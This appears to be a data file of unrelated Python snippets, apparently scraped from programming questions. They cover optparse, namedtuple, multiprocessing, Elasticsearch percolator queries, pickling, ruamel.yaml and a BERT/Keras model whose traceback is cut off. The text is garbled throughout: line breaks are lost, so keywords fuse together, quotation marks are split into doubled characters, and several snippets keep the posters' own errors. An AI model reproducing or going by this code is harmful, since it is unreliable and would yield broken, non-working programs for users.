"from optparse import OptionParserdef do_stuff ( opt1= '' a '' , opt2= '' b '' , opt3= '' c '' ) : print opt1 , opt2 , opt3if __name__ == `` __main__ '' : parser = OptionParser ( ) parser.add_option ( `` -- opt1 '' , default= '' a '' ) parser.add_option ( `` -- opt2 '' , default= '' b '' ) parser.add_option ( `` -- opt3 '' , default= '' c '' ) # parser.set_defaults ( opt1= '' a '' ) options , args = parser.parse_args ( ) do_stuff ( *args , **vars ( options ) )"
"Point = namedtuple ( 'Point ' , [ ' x ' , ' y ' ] ) Point = namedtuple ( [ ' x ' , ' y ' ] )"
"values = { ( 0 , 0 ) : 0 , ( 0 , 1 ) : 1 , ( 1 , 0 ) : 1 , ( 1 , 1 ) : 0 } values = { 0 : { 0 : 0 , 1 : 1 } , 1 : { 0 : 1 , 1 : 0 } } def convert ( values : { ( int , int ) : int } ) - > { int : { int : int } } : dictionary = { } l = [ ] for k in d.keys ( ) : l.append ( k ) for k , v in d.items ( ) : for i in l : if i == k : dictionary [ v ] = dict ( l ) return dictionary values = { 0 : { 0 : 1 , 1 : 1 } , 1 : { 0 : 1 , 1 : 1 } }"
"class A : passa = A ( ) a.x = ... class A ( metaclass=type ) : pass > > > object.__setattr__ ( A , ' x ' , ... ) TypeError : ca n't apply this __setattr__ to type object > > > type.__setattr__ ( A ( ) , ' x ' , ... ) TypeError : descriptor '__setattr__ ' requires a 'type ' object but received a ' A '"
class Foo ( object ) : pass class Foo ( type ) : pass
"fig = plt.figure ( ) ax = fig.add_subplot ( 111 , projection='3d ' ) ax.scatter ( x , y , z , c= ' r ' , marker= ' . ' ) h = np.np.histogram2d ( x , y ) plt.imshow ( h , cmap='cubehelix_r ' , interpolation='none ' )"
"def writeonfiles ( a , seed ) : random.seed ( seed ) f = open ( a , `` w+ '' ) for i in range ( 0,10 ) : j = random.randint ( 0,10 ) # print j f.write ( j ) f.close ( ) vector = [ Test/file1.txt , Test/file2.txt ] seeds = ( 123412 , 989898 ) , writeonfiles ( Test/file1.txt , 123412 ) writeonfiles ( Test/file2.txt , 989898 ) def writeonfiles_unpack ( args ) : return writeonfiles ( *args ) if __name__ == `` __main__ '' : folder = [ `` Test/ % d.csv '' % i for i in range ( 0,4 ) ] seed = [ 234124 , 663123 , 12345 ,123833 ] p = multiprocessing.Pool ( ) p.map ( writeonfiles , ( folder , seed ) ) if __name__ == `` __main__ '' : folder = [ `` Test/ % d.csv '' % i for i in range ( 0,4 ) ] seed = [ 234124 , 663123 , 12345 ,123833 ] p = multiprocessing.Process ( target=writeonfiles , args= [ folder , seed ] ) p.start ( ) @ contextmanager def poolcontext ( *args , **kwargs ) : pool = multiprocessing.Pool ( *args , **kwargs ) yield pool pool.terminate ( ) if __name__ == `` __main__ '' : folder = [ `` Test/ % d '' % i for i in range ( 0,4 ) ] seed = [ 234124 , 663123 , 12345 ,123833 ] a = zip ( folder , seed ) with poolcontext ( processes = 3 ) as pool : results = pool.map ( writeonfiles_unpack , a )"
"htmlfile = urllib2.urlopen ( line ) htmltext = htmlfile.read ( ) regexName = ' '' > < /a > ( .+ ? ) < /dd > < dt > 'patternName = re.compile ( regexName ) name = re.findall ( patternName , htmltext ) if name : text = name [ 0 ] else : text = 'unknown'nf.write ( text )"
"curl -XPUT 'localhost:9200/my-index ? pretty ' -H 'Content-Type : application/json ' -d ' { `` mappings '' : { `` _doc '' : { `` properties '' : { `` title '' : { `` type '' : `` text '' } , `` query '' : { `` type '' : `` percolator '' } } } } } ' curl -XPUT 'localhost:9200/my-index/_doc/1 ? refresh & pretty ' -H 'Content-Type : application/json ' -d ' { `` CourseId '' :35 , `` UnitId '' :12390 , `` id '' : '' 16069 '' , `` CourseName '' : '' ARK102U_ARKEOLOJİK ALAN YÖNETİMİ '' , `` FieldId '' :8 , `` field '' : '' TARİH '' , `` query '' : { `` span_near '' : { `` clauses '' : [ { `` span_term '' : { `` title '' : `` dünya '' } } , { `` span_term '' : { `` title '' : `` mirası '' } } , { `` span_term '' : { `` title '' : `` sözleşmesi '' } } ] , `` slop '' : 0 , `` in_order '' : true } } } ' curl -XGET 'localhost:9200/my-index/_search ? pretty ' -H 'Content-Type : application/json ' -d ' { `` query '' : { `` percolate '' : { `` field '' : `` query '' , `` document '' : { `` title '' : `` Arkeoloji , arkeolojik yöntemlerle ortaya çıkarılmış kültürleri , dünya mirası sözleşmesi sosyoloji , coğrafya , tarih , etnoloji gibi birçok bilim dalından yararlanarak araştıran ve inceleyen bilim dalıdır . Türkçeye yanlış bir şekilde > \ '' kazıbilim\ '' olarak çevrilmiş olsa da kazı , arkeolojik araştırma yöntemlerinden sadece bir tanesidir . '' } } } , `` highlight '' : { `` fields '' : { `` title '' : { } } } } ' import jsonfrom elasticsearch_dsl import ( DocType , Integer , Percolator , Text , ) # Read the json Filejson_data = open ( 'titles.json ' ) .read ( ) data = json.loads ( json_data ) docs = data [ 'response ' ] [ 'docs ' ] # Creating a elasticsearch connection # connections.create_connection ( hosts= [ 'localhost ' ] , port= [ '9200 ' ] , timeout=20 ) '' '' '' curl -XPUT 'localhost:9200/my-index ? pretty ' -H 'Content-Type : application/json ' -d ' { `` mappings '' : { `` _doc '' : { `` properties '' : { `` title '' : { `` type '' : `` text '' } , `` query '' : { `` type '' : `` percolator '' } } } } } ' '' '' '' class Documment ( DocType ) : course_id = Integer ( ) unit_id = Integer ( ) # title = Text ( ) id = Integer ( ) course_name = Text ( ) field_id = Integer ( ) field = Text ( ) class Meta : index = 'titles_index ' properties= { 'title ' : Text ( ) , 'query ' : Percolator ( ) } '' '' '' `` query '' : { `` span_near '' : { `` clauses '' : [ { `` span_term '' : { `` title '' : `` dünya '' } } , { `` span_term '' : { `` title '' : `` mirası '' } } , { `` span_term '' : { `` title '' : `` sözleşmesi '' } } ] , `` slop '' : 0 , `` in_order '' : true } } '' '' '' for doc in docs : terms = docs [ 'title ' ] .split ( “ ” ) course_id = docs [ 'CourseId ' ] unit_id = docs [ 'UnitId ' ] id = docs [ 'id ' ] course_name = docs [ 'CourseName ' ] field_id = docs [ 'FieldId ' ] field = docs [ 'field ' ] import jsonfrom elasticsearch_dsl import ( connections , DocType , Mapping , Percolator , Text ) from elasticsearch_dsl.query import ( SpanNear , SpanTerm ) from elasticsearch import Elasticsearch # Read the json Filejson_data = open ( 'titles.json ' ) .read ( ) data = json.loads ( json_data ) docs = data [ 'response ' ] [ 'docs ' ] # creating a new default elasticsearch connectionconnections.configure ( default= { 'hosts ' : 'localhost:9200 ' } , ) class Document ( DocType ) : title = Text ( ) query = Percolator ( ) class Meta : index = 'title-index ' doc_type = '_doc ' def save ( self , **kwargs ) : return super ( Document , self ) .save ( **kwargs ) # create the mappings in elasticsearchDocument.init ( ) # index the queryfor doc in docs : terms = doc [ 'title ' ] .split ( `` `` ) clauses = [ ] for term in terms : field = SpanTerm ( title=term ) clauses.append ( field ) query = SpanNear ( clauses=clauses ) item = Document ( title=doc [ 'title ' ] , query=query ) item.save ( ) elasticsearch.exceptions.AuthorizationException : TransportError ( 403 , 'cluster_block_exception ' , 'blocked by : [ FORBIDDEN/12/index read-only / allow delete ( api ) ] ; ' ) > > > text='Arkeoloji , arkeolojik yöntemlerle ortaya çıkarılmış kültürleri , dünya mirası sözleşmesi sosyoloji , coğrafya , tarih , etnoloji gibi birçok bilim dalından yararlanarak araştıran ve inceleyen bilim dalıdır . Türkçeye yanlış bir şekilde > \ '' kazıbilim\ '' olarak çevrilmiş olsa da kazı , arkeolojik araştırma yöntemlerinden sadece bir tanesidir . ' > > > s = Search ( ) .using ( client ) .query ( `` percolate '' , field='query ' , document= { 'title ' : text } ) .highlight ( 'title ' ) > > > print ( s.to_dict ( ) ) { 'query ' : { 'percolate ' : { 'field ' : 'query ' , 'document ' : { 'title ' : 'Arkeoloji , arkeolojik yöntemlerle ortaya çıkarılmış kültürleri , dünya mirası sözleşmesi sosyoloji , coğrafya , tarih , etnoloji gibi birçok bilim dalından yararlanarak araştıran ve inceleyen bilim dalıdır . Türkçeye yanlış bir şekilde > `` kazıbilim '' olarak çevrilmiş olsa da kazı , arkeolojik araştırma yöntemlerinden sadece bir tanesidir . ' } } } , 'highlight ' : { 'fields ' : { 'title ' : { } } } } > > > response = s.execute ( ) > > > response < Response : { } > curl -XGET 'localhost:9200/title-index/_search ? pretty ' -H 'Content-Type : application/json ' -d ' { `` query '' : { `` percolate '' : { `` field '' : `` query '' , `` document '' : { `` title '' : `` Arkeoloji , arkeolojik yöntemlerle ortaya çıkarılmış kültürleri , dünya mirası sözleşmesi sosyoloji , coğrafya , tarih , etnoloji gibi birçok bilim dalından yararlanarak araştıran ve inceleyen bilim dalıdır . Türkçeye yanlış bir şekilde > \ '' kazıbilim\ '' olarak çevrilmiş olsa da kazı , arkeolojik araştırma yöntemlerinden sadece bir tanesidir . '' } } } , `` highlight '' : { `` fields '' : { `` title '' : { } } } } ' { `` took '' : 3 , `` timed_out '' : false , `` _shards '' : { `` total '' : 5 , `` successful '' : 5 , `` skipped '' : 0 , `` failed '' : 0 } , `` hits '' : { `` total '' : 0 , `` max_score '' : null , `` hits '' : [ ] } } > > > response.to_dict ( ) { 'took ' : 9 , 'timed_out ' : False , '_shards ' : { 'total ' : 5 , 'successful ' : 5 , 'skipped ' : 0 , 'failed ' : 0 } , 'hits ' : { 'total ' : 0 , 'max_score ' : None , 'hits ' : [ ] } } > > > response { 'took ' : 12 , 'timed_out ' : False , '_shards ' : { 'total ' : 5 , 'successful ' : 5 , 'skipped ' : 0 , 'failed ' : 0 } , 'hits ' : { 'total ' : 0 , 'max_score ' : None , 'hits ' : [ ] } } > > > response { 'took ' : 12 , 'timed_out ' : False , '_shards ' : { 'total ' : 5 , 'successful ' : 5 , 'skipped ' : 0 , 'failed ' : 0 } , 'hits ' : { 'total ' : 0 , 'max_score ' : None , 'hits ' : [ ] } }"
"import numpy as npdef my_sqrt ( x ) : return np.sqrt ( x ) sc.parallelize ( range ( 10 ) ) .map ( my_sqrt ) .collect ( ) sc.parallelize ( [ ( my_sqrt , i ) for i in range ( 10 ) ] ) .map ( lambda x : x [ 0 ] ( x [ 1 ] ) ) .collect ( ) sc.parallelize ( [ ( np.sqrt , i ) for i in range ( 10 ) ] ) .map ( lambda x : x [ 0 ] ( x [ 1 ] ) ) .collect ( )"
"> > > np.__version__ ' 1.7.0 ' > > > np.sqrt ( 10000000000000000000 ) 3162277660.1683793 > > > np.sqrt ( 100000000000000000000 . ) 10000000000.0 > > > np.sqrt ( 100000000000000000000 ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > AttributeError : sqrt"
"from collections import namedtuplefrom typing import NamedTuplePersonTyping = NamedTuple ( 'PersonTyping ' , [ ( 'firstname ' , str ) , ( 'lastname ' , str ) ] ) PersonCollections = namedtuple ( 'PersonCollections ' , [ 'firstname ' , 'lastname ' ] ) pt = PersonTyping ( `` John '' , '' Smith '' ) pc = PersonCollections ( `` John '' , '' Smith '' ) import pickleimport tracebacktry : with open ( 'personTyping.pkl ' , 'wb ' ) as f : pickle.dump ( pt , f ) except : traceback.print_exc ( ) try : with open ( 'personCollections.pkl ' , 'wb ' ) as f : pickle.dump ( pc , f ) except : traceback.print_exc ( ) $ python3 prova.py Traceback ( most recent call last ) : File `` prova.py '' , line 16 , in < module > pickle.dump ( pt , f ) _pickle.PicklingError : Ca n't pickle < class 'typing.PersonTyping ' > : attribute lookup PersonTyping on typing failed $"
"$ ruamel.yaml.dump ( ruamel.yaml.load ( ' & A [ *A ] ' ) ) ' & id001- *id001 ' $ ruamel.yaml.dump ( ruamel.yaml.load ( `` foo : & foo { a : 42 } \nbar : { < < : *foo } '' ) ) bar : { a : 42 } foo : { a : 42 } data = { } data [ 'foo ' ] = { 'foo ' : { ' a ' : 42 } } data [ 'bar ' ] = { ' < < ' : data [ 'foo ' ] , ' b ' : 43 } $ ruamel.yaml.dump ( data , magic=True ) foo : & foo a : 42bar : < < : *foo b : 43 bar : ' < < ' : & id001 foo : a : 42 b : 43foo : *id001"
from pkg import module ... my_class = module.MyClass ( ) from pkg.module import MyClass ... my_class = MyClass ( )
resource [ 'contents ' ] [ media_type ] = [ ] resource [ 'contents ' ] [ media_type ] .append ( row [ 0 ] .toPython ( ) ) if row [ 0 ] is not None else Noneresource [ 'contents ' ] [ media_type ] .append ( row [ 2 ] .toPython ( ) ) if row [ 2 ] is not None else None
"[ run ] omit = ../*migrations* , ../*admin.py [ report ] show_missing = Trueexclude_lines = pragma : no cover from = models\ . from django.db import modelsclass Query ( models.Model ) : variable1 = models.CharField ( max_length=100 ) variable2 = models.CharField ( max_length=100 ) variable3 = models.CharField ( max_length=100 ) variable4 = models.CharField ( max_length=100 ) variable5 = models.CharField ( max_length=100 ) id = models.AutoField ( primary_key=True ) def some_function ( self ) : self.variable1 = self.variable2 + self.variable3 + self.variable4 + self.variable 5 return self.variable1"
"import sys , shlex , readline , os , stringList , assign , call , add , sub , div , Pow , mul , mod , fac , duf , read , \kill , clr , STO , RET , fib , curs = { } , `` set '' , `` get '' , `` + '' , `` - '' , `` / '' , `` ^ '' , `` * '' , \ '' % '' , `` fact '' , `` func '' , `` read '' , `` kill '' , `` clear '' , `` > '' , `` @ '' , `` fib '' , `` vars '' def fact ( num ) : if num == 1 : return 1 else : return num*fact ( num-1 ) def Simp ( op , num2 , num1 ) : global List try : num1 , num2 = float ( num1 ) , float ( num2 ) except : try : num1 = float ( num1 ) except : try : num2 = float ( num2 ) except : pass if op == mul : return num1*num2 elif op == div : return num1/num2 elif op == sub : return num1-num2 elif op == add : return num1+num2 elif op == Pow : return num1**num2 elif op == assign : List [ num1 ] = num2 ; return `` ok '' elif op == call : return List [ num1 ] elif op == fac : return fact ( num1 ) elif op == duf : return `` % s % s % s '' % ( duf , num1 , num2 ) elif op == mod : return num1 % num2 elif op == kill : del List [ num1 ] ; return `` ok '' elif op == clr : os.system ( `` clear '' ) elif op == STO : List [ num2 ] = num1 ; return `` ok '' elif op == RET : return List [ num1 ] elif op == curs : return List elif op == read : List [ num1 ] = Eval ( raw_input ( `` % s `` % num1 ) ) ; return `` ok '' def Eval ( expr ) : ops = `` % s % s % s % s % s % s % s % s % s % s % s % s % s % s % s % s '' % ( mul , add , sub , div , Pow , assign , call , fac , duf , mod , read , kill , clr , STO , RET , curs ) stack , expr , ops = [ ] , shlex.split ( string.lower ( expr ) ) , ops.split ( ) for i in expr : if i [ 0 ] ! = ' ; ' : if i not in ops : stack.append ( i ) elif i in ops : stack.append ( Simp ( i , stack.pop ( ) , stack.pop ( ) ) ) else : stack.append ( `` ok '' ) return stack [ 0 ] def shell ( ) : try : x = `` '' while x ! = `` quit '' : x = raw_input ( `` star > `` ) try : l = Eval ( x ) except KeyError : l = `` does not exist '' except : l = `` parse error ! '' if l ! = None : print `` = > '' , l , '' \n '' except ( EOFError , KeyboardInterrupt ) : printif len ( sys.argv ) > 1 : x = open ( sys.argv [ 1 ] , ' r ' ) ; l = x.readlines ( ) ; x.close ( ) for i in l : if i [ 0 ] ! = `` ; '' : i = ' '.join ( i.split ( ) ) x = Eval ( i ) if x ! = None : print i , '' \n = > '' , x , '' \n '' else : pass shell ( ) else : shell ( )"
"c = [ ] # for the total number of rowsfor i in range ( 0 , n ) : # get number of rows with only one entry in coordinate storage list if A [ 0 : ] [ 0 ] .count ( i ) == 1 : c.append ( i ) return c c = [ ] # for the total number of rows for i in range ( 0 , n ) : # get the index and initialize the count to 0 c.append ( [ i,0 ] ) # for every entry in coordinate storage list for j in A : # if row index ( A [ : ] [ 0 ] ) is equal to current row i , increment count if j [ 0 ] == i : c [ i ] [ 1 ] +=1return c # get total list of row indexes from coordinate storage listrow_indexes = [ i [ 0 ] for i in A ] # create dictionary { index : count } c = Counter ( row_indexes ) # return only value where count == 1 return [ c [ 0 ] for c in c.items ( ) if c [ 1 ] == 1 ]"
if not var : var = get_var ( ) var = var if var else get_var ( )
"class A ( object ) : def __init__ ( self , x , y ) : self.x = x self.y = y @ property def z ( self ) : return self.x+1 > > > a = A ( 1,5 ) > > > dict ( a ) { ' y':5 , ' z':2 }"
"t = Template ( ' can not teach an $ { dog.old } $ { tricks.new } . $ { why } is this $ { not } working ' ) print t.safe_substitute ( { 'dog.old ' : 'old dog ' , 'tricks.new ' : 'new tricks ' , 'why ' : 'OH WHY ' , 'not ' : ' @ # % @ # % NOT ' } ) can not teach an $ { dog.old } $ { tricks.new } . OH WHY is this @ # % @ # % NOT working"
"class Books ( models.Model ) : ... class Chapter ( models.Model ) : ... book = models.ForeignKey ( 'Books ' ) class Exercise ( models.Model ) : ... book = models.ForeignKey ( 'Books ' ) chapter = models.ForeignKey ( 'Chapter ' ) class ExerciseAdmin ( admin.ModelAdmin ) : ... list_filter = ( ( 'book ' , admin.RelatedOnlyFieldListFilter ) , ( 'chapter ' , admin.RelatedOnlyFieldListFilter ) ) admin.site.register ( Exercise , ExerciseAdmin )"
"from distutils.core import setup , Extensionmodule1 = Extension ( 'demo ' , sources = [ 'demo.c ' ] ) setup ( name = 'PackageName ' , version = ' 1.0 ' , description = 'This is a demo package ' , ext_modules = [ module1 ] ) C : / > python setup.py build_ext -- compiler=mingw32"
Key | FeatureA | FeatureB -- -- -- -- -- -- -- -- -- -- -- -- -- U1 | 0 | 1U2 | 1 | 1 Key | FeatureC | FeatureD | FeatureE -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -U1 | 0 | 0 | 1Key | FeatureF -- -- -- -- -- -- -- U2 | 1 Key | FeatureA | FeatureB | FeatureC | FeatureD | FeatureE | FeatureF -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -U1 | 0 | 1 | 0 | 0 | 1 | 0U2 | 1 | 1 | 0 | 0 | 0 | 1
"import requestsfrom bs4 import BeautifulSoupimport refrom tkinter import * # begin tkinter guidef show_entry_fields ( ) : print ( `` Wikipedia URL : % s '' % ( e1.get ( ) ) ) e1.delete ( 0 , END ) master = Tk ( ) Label ( master , text= '' Wikipedia URL '' ) .grid ( row=0 ) e1 = Entry ( master ) e1.insert ( 10 , '' http : //en.wikipedia.org/wiki/randomness '' ) e1.grid ( row=0 , column=1 ) Button ( master , text='Scrape ' , command=master.quit ) .grid ( row=3 , column=0 , sticky=W , pady=4 ) mainloop ( ) session = requests.Session ( ) selectWikiPage = input ( print ( `` Please enter the Wikipedia page you wish to scrape from '' ) ) if `` wikipedia '' in selectWikiPage : html = session.post ( selectWikiPage ) bsObj = BeautifulSoup ( html.text , `` html.parser '' ) findReferences = bsObj.find ( 'ol ' , { 'class ' : 'references ' } ) # isolate refereces section of page href = BeautifulSoup ( str ( findReferences ) , `` html.parser '' ) links = [ a [ `` href '' ] for a in href.find_all ( `` a '' , href=True ) ] for link in links : print ( `` Link : `` + link ) else : print ( `` Error : Please enter a valid Wikipedia URL '' )"
"Windows 10Python 3.6.4TenorFlow 1.12Keras 2.2.4No virtual environments were usedPyCharm Professional 2019.2 import osimport yamlimport numpy as npfrom argparse import ArgumentParserimport tensorflow as tfimport tensorflow_hub as hubfrom tensorflow.keras.layers import ( LSTM , Add , Bidirectional , Dense , Input , TimeDistributed , Embedding ) from tensorflow.keras.preprocessing.sequence import pad_sequencestry : from bert.tokenization import FullTokenizerexcept ModuleNotFoundError : os.system ( 'pip install bert-tensorflow ' ) from tensorflow.keras.models import Modelfrom tensorflow.keras import backend as Kfrom tqdm import tqdmfrom keras_bert import BertEmbeddingLayerfrom model_utils import visualize_plot_mdlfrom parsing_dataset import load_datasetfrom utilities import configure_tf , initialize_loggerdef parse_args ( ) : parser = ArgumentParser ( description= '' WSD '' ) parser.add_argument ( `` -- model_type '' , default='baseline ' , type=str , help= '' '' '' Choose the model : baseline : BiLSTM Model . attention : Attention Stacked BiLSTM Model . seq2seq : Seq2Seq Attention . '' '' '' ) return vars ( parser.parse_args ( ) ) def train_model ( mdl , data , epochs=1 , batch_size=32 ) : [ train_input_ids , train_input_masks , train_segment_ids ] , train_labels = data history = mdl.fit ( [ train_input_ids , train_input_masks , train_segment_ids ] , train_labels , epochs=epochs , batch_size=batch_size ) return historydef baseline_model ( output_size ) : hidden_size = 128 max_seq_len = 64 in_id = Input ( shape= ( None , ) , name= '' input_ids '' ) in_mask = Input ( shape= ( None , ) , name= '' input_masks '' ) in_segment = Input ( shape= ( None , ) , name= '' segment_ids '' ) bert_inputs = [ in_id , in_mask , in_segment ] bert_embedding = BertEmbeddingLayer ( ) ( bert_inputs ) embedding_size = 768 bilstm = Bidirectional ( LSTM ( hidden_size , dropout=0.2 , recurrent_dropout=0.2 , return_sequences=True ) ) ( bert_embedding ) output = TimeDistributed ( Dense ( output_size , activation= '' softmax '' ) ) ( bilstm ) mdl = Model ( inputs=bert_inputs , outputs=output , name= '' Bert_BiLSTM '' ) mdl.compile ( loss= '' sparse_categorical_crossentropy '' , optimizer='adadelta ' , metrics= [ `` acc '' ] ) return mdldef initialize_vars ( sess ) : sess.run ( tf.local_variables_initializer ( ) ) sess.run ( tf.global_variables_initializer ( ) ) sess.run ( tf.tables_initializer ( ) ) K.set_session ( sess ) class PaddingInputExample ( object ) : `` '' '' Fake example so the num input examples is a multiple of the batch size . When running eval/predict on the TPU , we need to pad the number of examples to be a multiple of the batch size , because the TPU requires a fixed batch size . The alternative is to drop the last batch , which is bad because it means the entire output data wo n't be generated . We use this class instead of ` None ` because treating ` None ` as padding batches could cause silent errors . `` `` '' class InputExample ( object ) : `` '' '' A single training/test example for simple sequence classification . '' '' '' def __init__ ( self , guid , text_a , text_b=None , label=None ) : `` '' '' Constructs a InputExample . Args : guid : Unique id for the example . text_a : string . The un-tokenized text of the first sequence . For single sequence tasks , only this sequence must be specified . text_b : ( Optional ) string . The un-tokenized text of the second sequence . Only must be specified for sequence pair tasks . label : ( Optional ) string . The label of the example . This should be specified for train and dev examples , but not for test examples. `` '' '' self.guid = guid self.text_a = text_a self.text_b = text_b self.label = labeldef create_tokenizer_from_hub_module ( bert_path= '' https : //tfhub.dev/google/bert_uncased_L-12_H-768_A-12/1 '' ) : `` '' '' Get the vocab file and casing info from the Hub module . '' '' '' bert_module = hub.Module ( bert_path ) tokenization_info = bert_module ( signature= '' tokenization_info '' , as_dict=True ) vocab_file , do_lower_case = sess.run ( [ tokenization_info [ `` vocab_file '' ] , tokenization_info [ `` do_lower_case '' ] , ] ) return FullTokenizer ( vocab_file=vocab_file , do_lower_case=do_lower_case ) def convert_single_example ( tokenizer , example , max_seq_length=256 ) : `` '' '' Converts a single ` InputExample ` into a single ` InputFeatures ` . '' '' '' if isinstance ( example , PaddingInputExample ) : input_ids = [ 0 ] * max_seq_length input_mask = [ 0 ] * max_seq_length segment_ids = [ 0 ] * max_seq_length label = [ 0 ] * max_seq_length return input_ids , input_mask , segment_ids , label tokens_a = tokenizer.tokenize ( example.text_a ) if len ( tokens_a ) > max_seq_length - 2 : tokens_a = tokens_a [ 0 : ( max_seq_length - 2 ) ] tokens = [ ] segment_ids = [ ] tokens.append ( `` [ CLS ] '' ) segment_ids.append ( 0 ) example.label.append ( 0 ) for token in tokens_a : tokens.append ( token ) segment_ids.append ( 0 ) tokens.append ( `` [ SEP ] '' ) segment_ids.append ( 0 ) example.label.append ( 0 ) input_ids = tokenizer.convert_tokens_to_ids ( tokens ) # The mask has 1 for real tokens and 0 for padding tokens . Only real # tokens are attended to . input_mask = [ 1 ] * len ( input_ids ) # Zero-pad up to the sequence length . while len ( input_ids ) < max_seq_length : input_ids.append ( 0 ) input_mask.append ( 0 ) segment_ids.append ( 0 ) example.label.append ( 0 ) assert len ( input_ids ) == max_seq_length assert len ( input_mask ) == max_seq_length assert len ( segment_ids ) == max_seq_length return input_ids , input_mask , segment_ids , example.labeldef convert_examples_to_features ( tokenizer , examples , max_seq_length=256 ) : `` '' '' Convert a set of ` InputExample ` s to a list of ` InputFeatures ` . '' '' '' input_ids , input_masks , segment_ids , labels = [ ] , [ ] , [ ] , [ ] for example in tqdm ( examples , desc= '' Converting examples to features '' ) : input_id , input_mask , segment_id , label = convert_single_example ( tokenizer , example , max_seq_length ) input_ids.append ( np.array ( input_id ) ) input_masks.append ( np.array ( input_mask ) ) segment_ids.append ( np.array ( segment_id ) ) labels.append ( np.array ( label ) ) return np.array ( input_ids ) , np.array ( input_masks ) , np.array ( segment_ids ) , np.array ( labels ) .reshape ( -1 , 1 ) def convert_text_to_examples ( texts , labels ) : `` '' '' Create InputExamples '' '' '' InputExamples = [ ] for text , label in zip ( texts , labels ) : InputExamples.append ( InputExample ( guid=None , text_a= '' `` .join ( text ) , text_b=None , label=label ) ) return InputExamples # Initialize sessionsess = tf.Session ( ) params = parse_args ( ) initialize_logger ( ) configure_tf ( ) # Load our config fileconfig_file_path = os.path.join ( os.getcwd ( ) , `` config.yaml '' ) config_file = open ( config_file_path ) config_params = yaml.load ( config_file ) # This parameter allow that train_x to be in form of words , to allow using of your keras-elmo layerelmo = config_params [ `` use_elmo '' ] dataset = load_dataset ( elmo=elmo ) vocabulary_size = dataset.get ( `` vocabulary_size '' ) output_size = dataset.get ( `` output_size '' ) # Parse data in Bert formatmax_seq_length = 64train_x = dataset.get ( `` train_x '' ) train_text = [ ' '.join ( x ) for x in train_x ] train_text = [ ' '.join ( t.split ( ) [ 0 : max_seq_length ] ) for t in train_text ] train_text = np.array ( train_text , dtype=object ) [ : , np.newaxis ] # print ( train_text.shape ) # ( 37184 , 1 ) train_labels = dataset.get ( `` train_y '' ) # Instantiate tokenizertokenizer = create_tokenizer_from_hub_module ( ) # Convert data to InputExample formattrain_examples = convert_text_to_examples ( train_text , train_labels ) # Extract features ( train_input_ids , train_input_masks , train_segment_ids , train_labels ) = convert_examples_to_features ( tokenizer , train_examples , max_seq_length=max_seq_length ) bert_inputs = [ train_input_ids , train_input_masks , train_segment_ids ] data = bert_inputs , train_labelsdel datasetmodel = baseline_model ( output_size ) # Instantiate variablesinitialize_vars ( sess ) history = train_model ( model , data ) Traceback ( most recent call last ) : File `` code/prova_bert.py '' , line 230 , in < module > model = baseline_model ( output_size , max_seq_len , visualize=True ) File `` code/prova_bert.py '' , line 165 , in baseline_model ) ( bert_embeddings ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\keras\layers\wrappers.py '' , line 473 , in __call__ return super ( Bidirectional , self ) .__call__ ( inputs , **kwargs ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\keras\engine\base_layer.py '' , line 746 , in __call__ self.build ( input_shapes ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\keras\layers\wrappers.py '' , line 612 , in build self.forward_layer.build ( input_shape ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\keras\utils\tf_utils.py '' , line 149 , in wrapper output_shape = fn ( instance , input_shape ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\keras\layers\recurrent.py '' , line 552 , in build self.cell.build ( step_input_shape ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\keras\utils\tf_utils.py '' , line 149 , in wrapper output_shape = fn ( instance , input_shape ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\keras\layers\recurrent.py '' , line 1934 , in build constraint=self.kernel_constraint ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\keras\engine\base_layer.py '' , line 609 , in add_weight aggregation=aggregation ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\training\checkpointable\base.py '' , line 639 , in _add_variable_with_custom_getter **kwargs_for_getter ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\keras\engine\base_layer.py '' , line 1977 , in make_variable aggregation=aggregation ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\ops\variables.py '' , line 183 , in __call__ return cls._variable_v1_call ( *args , **kwargs ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\ops\variables.py '' , line 146 , in _variable_v1_call aggregation=aggregation ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\ops\variables.py '' , line 125 , in < lambda > previous_getter = lambda **kwargs : default_variable_creator ( None , **kwargs ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\ops\variable_scope.py '' , line 2437 , in default_variable_creator import_scope=import_scope ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\ops\variables.py '' , line 187 , in __call__ return super ( VariableMetaclass , cls ) .__call__ ( *args , **kwargs ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\ops\resource_variable_ops.py '' , line 297 , in __init__ constraint=constraint ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\ops\resource_variable_ops.py '' , line 409 , in _init_from_args initial_value ( ) if init_from_fn else initial_value , File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\keras\engine\base_layer.py '' , line 1959 , in < lambda > shape , dtype=dtype , partition_info=partition_info ) File `` C : \Users\Sheikh\AppData\Local\Programs\Python\Python36\Lib\site-packages\tensorflow\python\ops\init_ops.py '' , line 473 , in __call__ scale /= max ( 1. , ( fan_in + fan_out ) / 2 . ) TypeError : unsupported operand type ( s ) for + : 